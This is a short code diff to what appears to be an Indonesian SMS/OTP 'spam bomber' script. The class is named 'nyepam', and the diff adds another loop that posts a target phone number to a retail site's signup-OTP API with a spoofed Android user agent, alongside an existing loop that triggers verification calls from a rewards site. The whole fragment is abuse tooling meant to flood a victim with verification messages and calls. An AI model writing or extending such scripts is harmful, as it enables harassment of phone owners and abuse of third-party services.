@@ -27,6 +27,10 @@ class nyepam:
 				if "Permintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok." in send:break
 				else:break
 			for x in range(asu):
+				send=req.post("https://cmsapi.mapclub.com/api/signup-otp",data={"phone":self._08},headers={"Connection": "keep-alive","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
+				if "ok" in send:break
+				else:break
+			for x in range(asu):
 				send=json.loads(reek.get(f"https://id.jagreward.com/member/verify-mobile/{self._8}").text)
 				if send["message"]=="Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.":continue
 				else:break
